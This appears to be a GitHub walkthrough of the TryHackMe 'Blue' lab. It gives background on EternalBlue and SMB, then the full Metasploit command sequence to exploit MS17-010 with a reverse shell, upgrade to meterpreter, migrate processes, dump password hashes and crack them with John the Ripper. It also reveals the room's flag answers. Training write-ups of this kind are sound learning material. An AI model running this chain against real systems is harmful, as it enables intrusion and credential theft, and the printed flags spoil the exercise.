# Eternal-Blue-THM-walkthrough
_A guided walkthrough to the "Blue" room on Try Hack Me_

TryHackMe Room: https://tryhackme.com/room/blue


# Background on Eternal Blue
**EternalBlue Exploit**

* **Creator:** United States National Security Agency (NSA)
* **Creation Date:** Leaked in April 2017
* **Release:** Shadow Brokers
* **Targeted Vulnerability:** MS17-010
* **Affected Systems:** Windows XP, Windows 7, Windows Server 2008
* **Exploit Impact:** Enables unauthorized remote code execution via the Server Message Block (SMB) protocol
* **Consequences:** Potential unauthorized access, data theft, or installation of malicious software
* **Global Impact:** Demonstrated during the WannaCry ransomware attack in May 2017, affecting critical systems in healthcare, finance, and government sectors.

_**What is SMB?**_

**Server Message Block (SMB) Protocol**

* **Definition:** Server Message Block (SMB) is a network file-sharing protocol that allows applications and users to access and communicate with files, printers, and other shared resources on a network. It operates as a client-server protocol, where a client requests services and resources from a server.

* **Versions:**
  - **SMB1:** The original version, widely used in older Windows systems. However, it has security vulnerabilities and is no longer recommended for use.
  - **SMB2 and SMB2.1:** Introduced in Windows Vista and Windows Server 2008. Designed to improve performance and address security concerns.
  - **SMB3:** The latest version, introduced in Windows 8 and Windows Server 2012. Offers enhanced security features, improved performance, and support for new functionalities.

* **Key Features:**
  - **File and Printer Sharing:** SMB facilitates the sharing of files and printers across a network, enabling seamless collaboration and resource access.
  - **Authentication and Authorization:** Provides mechanisms for authenticating users and authorizing access to shared resources based on user permissions.
  - **Named Pipes and RPC:** Supports interprocess communication (IPC) through named pipes and Remote Procedure Call (RPC), allowing processes on different systems to communicate.

* **Security Considerations:**
  - **Vulnerabilities:** Older versions of SMB, particularly SMB1, are susceptible to security vulnerabilities. It is recommended to use the latest versions to benefit from enhanced security features.
  - **Encryption:** SMB3 supports end-to-end encryption, ensuring data confidentiality during transmission.

* **Common Use Cases:**
  - **File Sharing:** Primary use is sharing files and folders between computers in a networked environment.
  - **Print Services:** Facilitates print services by allowing users to send print jobs to shared printers.
  - **Remote Access:** Enables remote access to files and resources on a server from client machines.

* **EternalBlue Exploit:**
  - The notorious EternalBlue exploit targeted a vulnerability in the SMB protocol, specifically in the way Windows systems handled SMB traffic. The exploit leveraged this weakness to propagate malware and execute arbitrary code on vulnerable systems.

* **Ongoing Developments:**
  - Continuous development and improvement of the SMB protocol by Microsoft to enhance performance, security, and compatibility with modern networking environments.



# Walkthrough 

# **Task 1:** 

First and foremost lets run some simple recon using _nmap_ 

A simple nmap scan such as the one listed below should get you started

```bash
nmap -p 0-1000 10.10.168.56
```


_**be sure to input the active machine IP address inside of THM and not the IP listed in the code box above**_

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20130522.png)

On top of doing this simple nmap scan. _**I recommend you add additional commands on top of nmap to gain additonal information such as version detection and vulnerability detection**_

I will not show the command used to allow you to research it yourself, but below is the output I recieved from utilizing multiple commands at once

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20130732.png)


Do your own research and reconnisance on how to input more complex commands. I recommend using the man and help pages within pentesting tools to get a good understanding of their capabiliteis and how to command them to do them.


**The best way to learn how to use these machines to their full potential is by using them!** 

With the knowledge from your nmap scan, do some research on the services and ports that are open to find vulnerabilites.

This THM room is all about the Eternal Blue exploit. I would start by researching it first and identifying its exploitation code as that is required for the third question of Task 1.

Common places to find vulnerabilities are:

https://www.exploit-db.com/

https://www.cve.org/ProgramOrganization/CNAs#CNAProgramGrowth (try searching by keyword)

https://www.infosecmatter.com/

https://nvd.nist.gov/vuln/search


# **Task 2**

Open Metasploit inside your machine

A very helpful source of information comes direct from Metasploit themselves. https://docs.metasploit.com/

If prompted, run the update command to make sure metasploit is up to date.
```bash
msfupdate
```
 _**Don't forget to utilize the help page within metasploit to identify available commands!**_ (_see more information on the help page below_)

Now that you have identified the exploit and its exploitation code, now we need to _search_ metasploit to find the full path to the code. To find this, run the command listed below in metasploit. 

```bash
search ms17-010
```
your search results should look like this:
![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20131322.png)

As you can see in the first response, the path to the exploit is 

```bash
exploit/windows/smb/ms17_010_eternalblue
```

Now, as instrtucted in question 3, use the command show options to get the _required_ value you will need to set.

To do this YOU MUST TELL METASPLOIT WHICH MODULE TO SHOW OPTIONS FOR OR YOU WILL RECEIVE GLOBAL OPTIONS. As you can see in the list, the exploit we intend to run is Module # 0. 

### Pro Tip:
**Utilizing the _help_ command within metasploit will give you insight on commands within metasploit**

Run the command below in metasploit

```bash
help
```
Since we are dealing with an exploit module (See **Matching Modules** in the search results from our previous command), you must scroll to module commands to get the available commands when dealing with modules

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20134603.png)


Since we are wanting to show options within the Eternal Blue exploit, we will be utilizing module 0. To tell metasploit which module to focus on utilize the _use_ command and specify module 0.

```bash
use 0
```
![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20134144.png)

Now that we have specidifed which module, we want to see what options are available and which ones are required for said exploit. 

```bash
show options
```
![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20135917.png)

As you can see from the output, there are muiltiple requirements, most of which are already set. The only option marked required that isn't already set is **RHOSTS**.

_** Be sure to follow the instructions on THM before running the exploit**_

**From THM: Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:**
```bash
set payload windows/x64/shell/reverse_tcp
```

But we are not ready yet, we must set the RHOSTS

To set the RHOSTS use the command _set_

```bash
set RHOSTS <target_IP>
```

_**be sure to fill in the IP of the machine you are targeting, for THM it is the active machine IP**_

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20141338.png)

Now we are ready to run the exploit!

use the command _run_ 

```bash
run
```

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20141651.png)

As you can see, instead of msf6, we are now commanding a Windows machine

**Press Ctrl+Z to background the shell**
. This allows you to return to the metasploit console while keeping the session active.

Now we need to see how to convert a shell to meterpreter shell in metasploit. You can research this online, or you can use the search feature of metasploit to find out the path to the module that will do this. 

```bash
search shell to meterpreter shell
```

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20161254.png)
![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20161317.png)

Take a look at the first picture to see a description of what each column means, and after some digging into the search results, you can see module 58 contains the module path that we are after
```bash
post/multi/manage/shell_to_meterpreter
```

Now that we have the module path, we need to tell metasploit to _use_ this module path using the command: 

```bash
use post/multi/manage/shell_to_meterpreter
```

After running that command we need to see what options we are required to set. Use the show options command

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20162046.png)

As you can see, the **SESSION** option is required but it is not set.

Before we can set the session, we need to see what sessions are currenty active. It helps to have metasploit running in a second window for you to refrence the help pages. Run the command "help sessions" to see all available options for sessions

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20162554.png)

If we look at the list of available options for sessions, "-l" will list all active sessions

Return to the metasploit window currently running the exploit and run

```bash
sessions -l
```

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20162911.png)

Now we need to set the active session to our target, in my case it was session 2, So I ran the command
```bash
set SESSION 2
```

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20163114.png)

Now run the exploit!

Give this step a few minutes to complete, once the machine stops and you see that a session has opened. press _enter_

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20163853.png)

Now, again, we need to identify the session of our target, use the sessions -l command to list all sessions and identify our target.

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20164151.png)

We can see that our target IP is active in all sessions, but meterpreter is running in session 4 (you should only see 2 sessions active, I ran the meterpreter exploit twice, that is why it shows two sessions on the photo, having multiple could come in handy later)


For the next step we need to _select_ the session we want to interact with, _not set_ the session. Lets take another look at the sessions help page to identify which command we need to use to interact with the correct session

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20164304.png)

We need to use the command:
```bash
sessions -i 2
```

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20164823.png)

As you can see we are now back inside of the windows machine. Now lets get to work!

The first step in remotely accessing machines is to figure out what user account you have accessed.

For this particular case we need to verify that we have escelated all the way to the top and have access to system level privileges.

Run the _whoami_ command

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20165006.png)

Congratulations, this is probably the deepest you will ever be in a Windows computer.

### **You have accessed the _nt authority/system_ account.**

_**This is the highest privileged account in windows operating systems, this account has system-level privileges, allowing it to perform actions and access resources that regular user accounts or even administrator accounts won't be able to. Even as an administrator you cannot access this account without some incredible privilege escelation.**_


Background this session (use the keyboard shortcut i mentioned earlier)

list your sessions once more, and start up the meterpreter session

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20172002.png)

using the instructions on THM, run getsystem to confirm we have excelated to system privileges. Then run 'shell' then 'whoami'

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20172035.png)

Again following the steps provided by THM, background the session to get back to the meterpreter session again and run the 'ps' command

Pick any process running at NT AUTHORITY/SYSTEM and write down the code. DO NOT USE THE CODE I USE, THEY COULD BE DIFFERENT ON YOUR MACHINE
![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20172901.png)

Now we need to migrate to that process

THIS WILL TAKE MULTIPLE ATTEMPS. It could kill meterpreter, so start up another meterpreter session if so and keep going at it. Utilize different codes until you have a successful migration.

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20174453.png)

Now we run the 'hashdump' command 

![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20174708.png)

As shown in the screenshot above, we have three users and their hash values, we are looking for the non-default user, in this case it is Jon, as Administrator and Guest accounts are default accounts. 

After a quick chat with Professor ChatGPT, you will see that hashdump outputs 4 values. 

**Username:RID:LMHash:NLTM Hash**


**The "Username"** refers to the unique identifier assigned to a user account on a Windows system. It is used for authentication and authorization purposes. Usernames are case-insensitive in Windows, and examples include "Administrator," "User1," etc.
Relative Identification (RID):

**The "Relative Identification" (RID)** is a component of a Security Identifier (SID) in Windows. The SID is a unique identifier assigned to each security principal, such as a user or group. The RID is a variable part of the SID and distinguishes different accounts within the same domain. For example, in the SID S-1-5-21-3623811015-3361044348-30300820-1013, the RID is 1013.
LM Hash:

**The LM hash** is a weak and outdated hashing algorithm used in older versions of Windows for storing user passwords. It splits the password into two 7-character halves, converts them to uppercase, and then hashes each half separately. Due to its vulnerabilities (such as susceptibility to rainbow table attacks and limited character set support), the use of LM hashes is deprecated in modern Windows systems. Newer systems often disable the storage of LM hashes, and stronger hashing algorithms like NTLM or Kerberos are preferred.
NTLM Hash:

**The NTLM hash** is a stronger hashing algorithm _used for storing user passwords in Windows_. It is part of the challenge-response authentication protocol used by Windows systems. When a user logs in, the system generates a challenge, and the client (user's machine) responds with a hash derived from the user's password. The NTLM hash is more secure than the LM hash, but it still has limitations and is susceptible to certain attacks. Windows systems often use NTLM for authentication, especially in environments where Active Directory is in use.


After reading the paragraphs above, which hash value would be worth cracking? 

**The NLTM hash**

You will need to do some research to see how to crack the hash. 

I recommend saving the hash value in a text file and then having John the Ripper break open this hash for us.

So open a terminal, copy the NLTM hash value and run the command 

```bash
echo 'YOUR HASH VALUE' > hash.txt
```

Then while in terminal run:
```bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![alt text](https://github.com/jeremydowdy/Eternal-Blue-THM-walkthrough/blob/main/Screenshot%202024-02-22%20181804.png)

The cracked password is in orange.


# Finding the Flags

*If you have made it this far, it should be safe for me to assume you are capable of navigating your way through directories. Use your google prowess to reseach potential locations where you can search directories and files. Use the hints provided by THM to assist in researching locations. 

If you need assistance, see below:

The first flag can be found at system root

inside of meterpreter use command
```bash
pwd
```
to see your present directory. You will need to move up twice, it should like:
```bash
meterpreter > pwd
C:\Windows|system32
meterpreter > cd ..
meterpreter > cd ..
meterpreter > dir
Listing: C:\
```
Inside of that directory you shoulde be able to identify the flag1.txt

cat the flag file and check its contents for your first flag:
```bash
flag{access_the_machine}
```

Flag2 can be found at the location where passwords are stored within Windows.

Some GoogleFu tells us that passwords are stored within
```bash
c:\Windows\System32\Config
```
Change your directory to there and run
```bash
cat flag2.txt
```

The second flag is 
```bash
flag{sam_database_elevated_access}
```

Flag3 can be found in "an excellent location to loot" (THM's words not mine) 

Lets look in the users folder. Change your directory to
```bash
C:\Users

cd c:\Users

ls
```

It doesnt seem to be in there, BUT, we do see that our good buddy and target Jon, is an administrator with all read write and execute privileges (rwxrwxrwx)
```bash
cd Jon
```
When we are in Jon's direcatory we should run the ls command to see what Jon is hiding.

You should notice that there is a documents file

```bash
meterpreter > cd Documents
meterpreter > ls
Listing: C:\Users\Jon\Documents

You should see the flag3.txt

meterpreter > cat flag3.txt
 flag{admin_documents_can_be_valuable}
 ```


 Congratulations! You have completed the Blue room on TryHackMe! Enjoy your badge. If you used my walkthrough consider following me on GitHub! 
